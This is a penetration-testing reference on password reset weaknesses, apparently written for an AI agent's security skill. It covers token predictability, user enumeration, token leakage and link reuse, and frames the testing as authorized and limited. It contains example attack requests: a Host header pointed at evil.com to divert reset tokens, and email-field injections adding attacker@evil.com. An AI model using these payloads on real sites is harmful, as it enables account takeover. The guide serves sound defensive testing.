# Password Reset Security Payload

> ⚠️ **Security Boundary Statement**
> 
> This document is for **authorized penetration testing reference** only, helping identify password reset vulnerability risk characteristics.
> 
> - All payloads are **technical principle demonstrations**, actual account takeover is prohibited
> - Password reset payloads are for understanding attack surface only, **no credential capture**
> - Validation proves vulnerability existence (reset link flaw), **no actual password reset executed**
> - See `SKILL.md` for specific execution boundaries
> 
> **Core Principle**: Prove existence, do not enable harm

---

## Source: PayloadsAllTheThings, HackTricks

## Manual Testing

**Note: Test reset token generation, link handling, and user enumeration**

---

## Validation Objectives (Within Security Boundary)

Password reset vulnerability validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| Reset Link Predictability | ✓ Analyze token pattern | - | Predict and use real token |
| User Enumeration | ✓ Test response differences | - | Enumerate all users |
| Token Leakage | ✓ Check token exposure points | - | Intercept real tokens |
| Link Validity Window | ✓ Test expiration | - | Use leaked token |
| Host Header Injection | ✓ Test host manipulation | - | Send reset to attacker |

**Safe Validation Method**: Analyze token structure and link handling; do not execute actual password reset for other accounts.

---

## Password Reset Flow

```
1. Request Reset
   POST /reset-password
   email=user@example.com

2. Server Response
   - Email sent with reset link
   - OR: Reset link returned in response (bad)

3. Reset Link
   https://app.com/reset?token=RANDOM_TOKEN

4. Password Update
   POST /reset-password/confirm
   token=RANDOM_TOKEN&new_password=XXX
```

---

## Token Predictability

### Analyze Token Structure

```bash
# Request reset for test account
POST /reset-password
email=test@example.com

# Analyze received token:
- Length: 32 chars? 64 chars?
- Format: hex? base64? UUID? timestamp-based?
- Pattern: sequential? random?

# Test predictability patterns
Token: 64789abc -> Next: 64789abd? (sequential)
Token: 202605031000 -> Timestamp-based?
Token: md5(email) -> Hash-based?
Token: base64(timestamp+email) -> Decodable?
```

### Token Generation Flaws

| Pattern | Risk | Detection |
|---------|------|-----------|
| Sequential numeric | High | Request multiple, observe increment |
| Timestamp | Medium | Decode token, check if contains time |
| Hash of email | Medium | Same email -> same token |
| Short token (<6 chars) | High | Brute force feasible |
| Base64 encoded data | Medium | Decode reveals user/time |

---

## User Enumeration

### Response Difference Testing

```bash
# Valid email
POST /reset-password
email=valid@example.com
-> Response: "Reset link sent" or similar

# Invalid email
POST /reset-password
email=invalid@example.com
-> Response: "Email not found" or "Invalid email"

# If responses differ -> user enumeration possible
```

### Timing Analysis

```bash
# Measure response time
valid@example.com -> 500ms (email sent)
invalid@example.com -> 50ms (quick rejection)

# Timing difference -> enumeration possible
```

### Error Message Analysis

```text
# Enumeration indicators
"User with this email does not exist" -> Enumeration
"No account found for this email" -> Enumeration
"If this email exists, you will receive a reset link" -> Safe
"A reset link has been sent if this email exists" -> Safe
```

---

## Token Leakage

### Token in Response Body

```bash
POST /reset-password
email=user@example.com

# Response contains:
{
  "reset_token": "abc123",  ← Token leaked!
  "reset_url": "https://app.com/reset?token=abc123"
}

# Anyone can use this token
```

### Token in URL Fragment vs Query

```text
# Query parameter (visible in logs, history)
/reset?token=abc123  ← Leaked to logs, Referer

# Fragment (not sent to server)
/reset#token=abc123  ← Better, but JS accessible

# POST body (best)
POST /reset-confirm
token=abc123  ← Not visible in URL
```

### Token via Host Header

```bash
# Manipulate Host header
POST /reset-password
Host: evil.com
email=user@example.com

# If reset link uses Host header:
https://evil.com/reset?token=abc123

# Token sent to attacker-controlled domain
```

### Referer Header Leakage

```text
# After clicking reset link, check:
- Page loads external resources (images, CSS, JS)
- Reset token may appear in Referer header to those resources
- Check if page contains links to external domains
```

---

## Link Validity Issues

### No Expiration

```bash
# Request reset link
# Wait 24 hours or more
# Try using same token

# If still valid -> no expiration, link reusable forever
```

### Multiple Use

```bash
# Use reset link once
# Try using same link again

# If accepted again -> link reusable, attack window extended
```

### Token Bound to Session

```bash
# Request reset in session A
# Use reset link in session B (different browser)

# If rejected -> good (token bound to session/IP)
# If accepted -> token portable
```

---

## Reset Link Manipulation

### Email Parameter Injection

```bash
POST /reset-password
email=user@example.com%0a%0dCC:attacker@evil.com

# If header injection works -> reset email forwarded
```

### Multiple Email Injection

```bash
POST /reset-password
email=user@example.com,attacker@evil.com

# If both receive reset -> email parameter injection
```

---

## Password Policy Bypass

### Weak Password Acceptance

```bash
POST /reset-password/confirm
token=abc123&new_password=123

# If accepted -> weak password policy
```

### Same Password

```bash
POST /reset-password/confirm
token=abc123&new_password=current_password

# If accepted -> can reset to same password (useless reset)
```

---

## Analysis Process

1. Identify password reset endpoint from discovery phase
2. Request reset for controlled test account (your own)
3. Analyze received token structure and predictability
4. Test user enumeration with valid/invalid emails
5. Check if token returned in response body
6. Test Host header manipulation
7. Test link expiration and reuse
8. **Stop validation**, document flaws found
9. Do not reset passwords for accounts you don't own

---

## Output

```markdown
## Vulnerability: Password Reset Token Predictability

### Location
{URL} - /reset-password

### Vulnerability Type
{Token Predictability / User Enumeration / Token Leakage / Host Header}

### Evidence
- Token format: {timestamp-based / sequential / hash-based}
- Enumeration: {response differs for valid/invalid}
- Token in response: {yes/no}

### Validation Result
- Requested reset for test account
- Token received: abc123xyz789
- Pattern analysis: {timestamp embedded}

### Risk Level
{see severity rules}

### Severity Classification

Password reset vulnerabilities must confirm **reset chain is actually exploitable by attacker** for High. Suspicious token structure / reset flow existing does not equal account takeover — must prove token is predictable/interceptable, and can use it to reset a real account.

| Actual case | Severity | Note |
|---------|------|------|
| Confirmed token predictable (multiple requests found pattern and successfully predicted/replayed)| **High** | Token predictable = arbitrary account takeover |
| Host header poisoning actually sent (reset email contains poisoned link, verified with user authorization)| **High** | See host-header.md scenario gating |
| Token not expired / replay succeeds (old token completes reset)| **High** | Reset chain actually exploitable |
| Token structure suspected predictable (contains timestamp/short length/weak entropy) but prediction not verified | Medium | Hint exists, exploitability not confirmed |
| Only reset flow exists / token randomness cannot be judged | Low | Pending confirmation |

**Boundary**: Password reset involves triggering real email / modifying real account, is Tier 2 (requires user authorization). Within default scope analyze token structure / check whether Host header is consumed — but "using token to complete reset = High" requires verification with test account within authorized scope. Do not report Critical based on "token seems to have timestamp".
```

---

## Prohibited Operations Checklist

| Prohibited | Description |
|------|------|
| ❌ Reset other users' passwords | Do not use discovered flaws to reset real accounts |
| ❌ Token brute force | Do not brute force tokens to reset passwords |
| ❌ Account takeover | Do not take over accounts using reset flaws |
| ❌ Intercept real emails | Do not intercept password reset emails for others |
| ❌ Email injection attack | Do not inject attacker emails into reset requests |

---

## Execution Boundary Reference

Complete security boundary:
- `SKILL.md` -> Core Principles -> "Prove existence, do not enable harm"
- `SKILL.md` -> Action Policy -> "Data create/update/delete | Ask first, limit to test data"